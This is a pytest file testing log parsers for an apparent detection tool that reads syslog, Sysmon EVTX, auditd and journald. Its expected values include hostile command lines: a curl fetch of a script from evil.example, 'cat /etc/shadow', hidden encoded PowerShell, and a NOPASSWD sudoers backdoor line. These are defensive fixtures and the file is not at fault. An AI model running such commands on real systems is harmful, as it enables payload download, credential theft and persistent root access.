"""Tests for log ingestion: Linux syslog, Windows EVTX, and source selection."""

from __future__ import annotations

import logging
from collections.abc import Iterator
from datetime import UTC, datetime
from pathlib import Path

import pytest

from bastion.ingest.auditd import AuditdSource
from bastion.ingest.base import select_source
from bastion.ingest.evtx import EvtxSource, xml_to_event
from bastion.ingest.journald import JournaldSource
from bastion.ingest.linux import LinuxLogSource
from bastion.models import Event

FIXTURES = Path(__file__).parent / "fixtures"
AUTH_LOG = FIXTURES / "auth_sample.log"
AUDIT_LOG = FIXTURES / "audit_sample.log"
JOURNAL_LOG = FIXTURES / "journald_sample.jsonl"
SYSMON_XML = (FIXTURES / "sysmon_process_creation.xml").read_text(encoding="utf-8")


class TestLinuxLogSource:
    def parse_all(self) -> list[Event]:
        return list(LinuxLogSource().parse(AUTH_LOG))

    def test_parses_well_formed_lines_and_skips_malformed(
        self, caplog: pytest.LogCaptureFixture
    ) -> None:
        with caplog.at_level(logging.WARNING):
            events = self.parse_all()
        # 8 non-blank lines in the fixture, one of them malformed.
        assert len(events) == 7
        assert any("malformed" in record.message for record in caplog.records)

    def test_classic_syslog_fields(self) -> None:
        event = self.parse_all()[0]
        assert event.platform == "linux"
        assert event.source == "auth_sample.log"
        assert event.fields["host"] == "web01"
        assert event.fields["process"] == "sshd"
        assert event.fields["pid"] == 412
        assert event.fields["user"] == "alice"
        assert event.raw.startswith("Jun 10 06:12:01 web01 sshd[412]:")
        assert event.timestamp is not None
        assert (event.timestamp.month, event.timestamp.day) == (6, 10)
        assert (event.timestamp.hour, event.timestamp.minute) == (6, 12)

    def test_user_extracted_from_invalid_user_failure(self) -> None:
        event = self.parse_all()[2]
        assert event.fields["user"] == "admin"

    def test_user_extracted_from_sudo_line(self) -> None:
        event = self.parse_all()[3]
        assert event.fields["process"] == "sudo"
        assert event.fields["user"] == "alice"
        assert event.fields["pid"] is None

    def test_session_opened_user_strips_uid_suffix(self) -> None:
        event = self.parse_all()[4]
        assert event.fields["user"] == "root"

    def test_iso_timestamp_line(self) -> None:
        event = self.parse_all()[5]
        assert event.timestamp == datetime(2026, 6, 10, 6, 16, 30, 123456, tzinfo=UTC)
        assert event.fields["user"] == "root"

    def test_line_without_user_has_no_user_field(self) -> None:
        event = self.parse_all()[6]
        assert event.fields["process"] == "systemd-logind"
        assert "user" not in event.fields


class TestXmlToEvent:
    def test_normalizes_sysmon_process_creation(self) -> None:
        event = xml_to_event(SYSMON_XML, source="sample.evtx")
        assert event is not None
        assert event.platform == "windows"
        assert event.source == "sample.evtx"
        assert event.fields["EventID"] == 1
        assert event.fields["Channel"] == "Microsoft-Windows-Sysmon/Operational"
        assert event.fields["Computer"] == "DESKTOP-VICTIM01"
        assert event.fields["Provider"] == "Microsoft-Windows-Sysmon"
        assert event.fields["Image"] == (
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        )
        assert event.fields["CommandLine"] == "powershell.exe -nop -w hidden -enc SQBFAFgA"
        assert event.fields["ParentImage"] == "C:\\Windows\\System32\\cmd.exe"
        assert event.raw == SYSMON_XML

    def test_subsecond_precision_beyond_microseconds_is_trimmed(self) -> None:
        event = xml_to_event(SYSMON_XML, source="sample.evtx")
        assert event is not None
        assert event.timestamp == datetime(2019, 7, 19, 14, 2, 1, 123456, tzinfo=UTC)

    def test_malformed_xml_returns_none_with_warning(
        self, caplog: pytest.LogCaptureFixture
    ) -> None:
        with caplog.at_level(logging.WARNING):
            event = xml_to_event("<Event><System>", source="bad.evtx")
        assert event is None
        assert any("malformed" in record.message for record in caplog.records)

    def test_empty_data_element_becomes_empty_string(self) -> None:
        event = xml_to_event(SYSMON_XML, source="sample.evtx")
        assert event is not None
        assert event.fields["RuleName"] == ""


class _FakeRecord:
    def __init__(self, xml: str) -> None:
        self._xml = xml

    def xml(self) -> str:
        return self._xml


class _BrokenRecord:
    def xml(self) -> str:
        raise ValueError("corrupt chunk")


class _FakeEvtx:
    """Stands in for Evtx.Evtx.Evtx so EVTX parsing is testable offline."""

    def __init__(self, path: str) -> None:
        self.path = path

    def __enter__(self) -> _FakeEvtx:
        return self

    def __exit__(self, *args: object) -> None:
        return None

    def records(self) -> Iterator[_FakeRecord | _BrokenRecord]:
        yield _FakeRecord(SYSMON_XML)
        yield _BrokenRecord()
        yield _FakeRecord("<not-xml")
        yield _FakeRecord(SYSMON_XML)


class TestEvtxSource:
    def test_parse_skips_broken_records_without_aborting(
        self, monkeypatch: pytest.MonkeyPatch, caplog: pytest.LogCaptureFixture
    ) -> None:
        monkeypatch.setattr("bastion.ingest.evtx.Evtx", _FakeEvtx)
        with caplog.at_level(logging.WARNING):
            events = list(EvtxSource().parse(Path("sample.evtx")))
        assert len(events) == 2
        assert all(event.fields["EventID"] == 1 for event in events)
        assert any("unreadable record" in record.message for record in caplog.records)


class TestAuditdSource:
    def test_groups_records_by_audit_id(self, caplog: pytest.LogCaptureFixture) -> None:
        with caplog.at_level(logging.WARNING):
            events = list(AuditdSource().parse(AUDIT_LOG))
        assert len(events) == 3  # three audit ids in the fixture
        assert any("malformed auditd line" in record.message for record in caplog.records)

    def test_syscall_and_execve_records_are_merged(self) -> None:
        event = next(iter(AuditdSource().parse(AUDIT_LOG)))
        assert event.platform == "linux"
        assert event.fields["Image"] == "/usr/bin/cat"
        assert event.fields["exe"] == "/usr/bin/cat"
        assert event.fields["comm"] == "cat"
        assert event.fields["CommandLine"] == "cat /etc/shadow"
        assert event.fields["key"] == "creds"
        assert event.fields["cwd"] == "/root"
        assert event.fields["type"] == "SYSCALL"
        assert event.timestamp is not None
        assert event.timestamp == datetime.fromtimestamp(1780000000.101, tz=UTC)
        assert "type=EXECVE" in event.raw

    def test_hex_encoded_argument_is_decoded(self) -> None:
        event = list(AuditdSource().parse(AUDIT_LOG))[1]
        assert event.fields["CommandLine"] == "curl -s https://evil.example/p.sh"

    def test_stats_count_records_and_skipped_lines(self) -> None:
        source = AuditdSource()
        list(source.parse(AUDIT_LOG))
        assert source.stats == {"records": 8, "skipped": 1}


def _parse(tmp_path: Path, *lines: str) -> tuple[list[Event], AuditdSource]:
    path = tmp_path / "audit.log"
    path.write_bytes(("\n".join(lines) + "\n").encode("utf-8"))
    source = AuditdSource()
    return list(source.parse(path)), source


class TestAuditdFormats:
    """Record shapes found in Splunk attack_data that the B1 parser could not read."""

    def test_interpreted_records_parse(self, tmp_path: Path) -> None:
        events, source = _parse(
            tmp_path,
            "type=SYSCALL msg=audit(04/16/2025 09:14:42.784:96444) : arch=x86_64 "
            "syscall=execve success=yes a0=0x5bb5511644d0 uid=root exe=/usr/bin/split",
            "type=EXECVE msg=audit(04/16/2025 09:14:42.784:96444) : argc=4 a0=split a1=-b "
            "a2=1000000 a3=split_me.txt ",
            "----",
        )
        assert source.stats == {"records": 2, "separators": 1}
        [event] = events
        assert event.timestamp == datetime(2025, 4, 16, 9, 14, 42, 784000, tzinfo=UTC)
        assert event.fields["syscall"] == "execve"
        assert event.fields["uid"] == "root"
        assert event.fields["Image"] == "/usr/bin/split"
        assert event.fields["CommandLine"] == "split -b 1000000 split_me.txt"

    def test_interpreted_values_keep_their_spaces(self, tmp_path: Path) -> None:
        events, _ = _parse(
            tmp_path,
            "type=PROCTITLE msg=audit(02/20/2025 10:42:55.725:93710): "
            "proctitle=echo malware_user ALL=(ALL) NOPASSWD: ALL",
            "type=EXECVE msg=audit(02/20/2025 13:08:29.059:147588) : argc=3 a0=grep a1=-v "
            "a2=File does not exist:\\|config-set-passwords already ran ",
        )
        assert events[0].fields["proctitle"] == "echo malware_user ALL=(ALL) NOPASSWD: ALL"
        assert "ALL" not in events[0].fields  # not mistaken for a key
        assert events[1].fields["a2"] == "File does not exist:\\|config-set-passwords already ran"
        assert str(events[1].fields["CommandLine"]).startswith("grep -v File does not exist")

    def test_interpreted_execve_is_bounded_by_argc(self, tmp_path: Path) -> None:
        # argc=1: the one argument runs to the end, even where it looks like another key.
        events, _ = _parse(
            tmp_path, "type=EXECVE msg=audit(02/20/2025 10:00:00.000:1) : argc=1 a0=echo a1=b"
        )
        assert events[0].fields["CommandLine"] == "echo a1=b"
        assert "a1" not in events[0].fields
        assert events[0].fields["argc"] == "1"

    def test_enriched_half_is_read(self, tmp_path: Path) -> None:
        events, source = _parse(
            tmp_path,
            "type=SYSCALL msg=audit(1724076881.293:4522): syscall=42 a0=4 uid=1000 "
            'comm="route" exe="/usr/sbin/route"\x1dARCH=x86_64 SYSCALL=connect UID="ubuntu"',
        )
        assert source.stats == {"records": 1}
        fields = events[0].fields
        assert (fields["syscall"], fields["SYSCALL"]) == ("42", "connect")
        assert (fields["uid"], fields["UID"]) == ("1000", "ubuntu")

    def test_quoted_msg_pairs_are_lifted(self, tmp_path: Path) -> None:
        events, _ = _parse(
            tmp_path,
            "type=SERVICE_STOP msg=audit(1722957155.494:4802): pid=1 uid=0 auid=4294967295 "
            'msg=\'unit=atd comm="systemd" exe="/usr/lib/systemd/systemd" res=success\'',
        )
        fields = events[0].fields
        assert fields["unit"] == "atd"
        assert fields["Image"] == "/usr/lib/systemd/systemd"
        assert fields["auid"] == "4294967295"  # a number, never hex decoded
        assert str(fields["msg"]).startswith("unit=atd")

    def test_command_line_comes_only_from_execve(self, tmp_path: Path) -> None:
        events, _ = _parse(
            tmp_path,
            "type=SYSCALL msg=audit(1780000000.100:1): syscall=59 a0=26 a1=55d11c9a4ec0 "
            'exe="/usr/bin/id"',
        )
        fields = events[0].fields
        assert "CommandLine" not in fields
        assert fields["a0"] == "26"  # a syscall argument, not hex encoded text

    def test_raw_proctitle_is_decoded_with_spaces(self, tmp_path: Path) -> None:
        argv = b"cat\x00/etc/shadow".hex().upper()
        record = f"type=PROCTITLE msg=audit(1780000000.100:1): proctitle={argv}"
        events, _ = _parse(tmp_path, record)
        assert events[0].fields["proctitle"] == "cat /etc/shadow"

    def test_interleaved_records_are_merged(self, tmp_path: Path) -> None:
        events, _ = _parse(
            tmp_path,
            'type=SYSCALL msg=audit(1780000000.100:1): syscall=59 exe="/usr/bin/id"',
            'type=SYSCALL msg=audit(1780000000.100:2): syscall=59 exe="/usr/bin/ls"',
            'type=EXECVE msg=audit(1780000000.100:1): argc=1 a0="id"',
        )
        assert [(e.fields["Image"], e.fields.get("CommandLine")) for e in events] == [
            ("/usr/bin/id", "id"),
            ("/usr/bin/ls", None),
        ]

    def test_hyphenated_keys_and_brace_groups(self, tmp_path: Path) -> None:
        events, _ = _parse(
            tmp_path,
            "type=LOGIN msg=audit(1780000000.100:1): pid=5 old-auid=4294967295 auid=1000 "
            "SADDR={ saddr_fam=inet laddr=192.0.2.10 lport=21 }",
        )
        fields = events[0].fields
        assert (fields["old-auid"], fields["auid"]) == ("4294967295", "1000")
        assert fields["laddr"] == "192.0.2.10"
        assert str(fields["SADDR"]).startswith("{")

    def test_record_reappearing_after_emission_is_warned(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, caplog: pytest.LogCaptureFixture
    ) -> None:
        import bastion.ingest.auditd as auditd

        monkeypatch.setattr(auditd, "MERGE_WINDOW_RECORDS", 1)
        with caplog.at_level(logging.WARNING):
            events, _ = _parse(
                tmp_path,
                'type=SYSCALL msg=audit(1780000000.100:1): exe="/usr/bin/id"',
                'type=SYSCALL msg=audit(1780000000.100:2): exe="/usr/bin/ls"',
                'type=EXECVE msg=audit(1780000000.100:1): argc=1 a0="id"',
            )
        assert len(events) == 3
        assert any("reappeared" in record.message for record in caplog.records)


class TestJournaldSource:
    def test_parses_json_lines_and_skips_garbage(self, caplog: pytest.LogCaptureFixture) -> None:
        with caplog.at_level(logging.WARNING):
            events = list(JournaldSource().parse(JOURNAL_LOG))
        assert len(events) == 3  # one non-JSON line and one binary message skipped
        messages = [record.message for record in caplog.records]
        assert any("non-JSON" in message for message in messages)
        assert any("without text" in message for message in messages)

    def test_fields_and_timestamp(self) -> None:
        event = next(iter(JournaldSource().parse(JOURNAL_LOG)))
        assert event.fields["process"] == "sshd"
        assert event.fields["pid"] == 412
        assert event.fields["host"] == "web01"
        assert event.fields["user"] == "admin"
        assert event.timestamp == datetime.fromtimestamp(1780000500, tz=UTC)

    def test_syslog_identifier_fallback_and_sudo_user(self) -> None:
        event = list(JournaldSource().parse(JOURNAL_LOG))[1]
        assert event.fields["process"] == "sudo"
        assert event.fields["user"] == "alice"


class TestSelectSource:
    def test_sniffs_auditd_from_content(self) -> None:
        assert isinstance(select_source(AUDIT_LOG), AuditdSource)

    def test_sniffs_plain_syslog_from_content(self) -> None:
        assert isinstance(select_source(AUTH_LOG), LinuxLogSource)

    def test_jsonl_extension_picks_journald(self) -> None:
        assert isinstance(select_source(JOURNAL_LOG), JournaldSource)

    def test_json_content_in_dot_log_picks_journald(self, tmp_path: Path) -> None:
        log = tmp_path / "export.log"
        log.write_text('{"MESSAGE": "hello"}\n', encoding="utf-8")
        assert isinstance(select_source(log), JournaldSource)

    def test_evtx_extension_wins(self) -> None:
        assert isinstance(select_source(Path("logs.evtx")), EvtxSource)

    def test_text_extensions_pick_linux(self) -> None:
        assert isinstance(select_source(Path("auth.log")), LinuxLogSource)
        assert isinstance(select_source(Path("messages.txt")), LinuxLogSource)

    def test_extension_beats_platform_override(self) -> None:
        assert isinstance(select_source(Path("logs.evtx"), "linux"), EvtxSource)

    def test_override_decides_ambiguous_extension(self) -> None:
        assert isinstance(select_source(Path("export.bin"), "windows"), EvtxSource)
        assert isinstance(select_source(Path("export.bin"), "linux"), LinuxLogSource)

    @pytest.mark.parametrize(
        ("system", "expected"), [("Windows", EvtxSource), ("Linux", LinuxLogSource)]
    )
    def test_host_os_decides_when_ambiguous_and_no_override(
        self, monkeypatch: pytest.MonkeyPatch, system: str, expected: type
    ) -> None:
        monkeypatch.setattr("bastion.ingest.base._platform.system", lambda: system)
        assert isinstance(select_source(Path("export.bin")), expected)
